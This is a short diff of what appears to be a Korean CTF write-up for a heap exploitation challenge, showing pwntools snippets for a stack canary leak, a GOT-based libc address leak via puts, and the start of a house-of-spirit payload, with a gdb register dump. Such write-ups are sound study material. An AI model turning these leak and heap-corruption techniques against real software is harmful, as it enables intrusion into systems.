@@ -162,6 +162,7 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
 `canary` 도 똑같은 방법으로 leak 하면 된다.  
   
 2. GOT leak  
+
 ```
     giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
     libc = show(0) - elf.symbols['puts']
@@ -189,6 +190,7 @@ RSI  0x601f90 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f4af32e1170 (puts)
 ```
   
 3. house of spirit  
+
 ```
     exp = 'no\x00'.ljust(8, 'C')
     exp += p64(0x20)
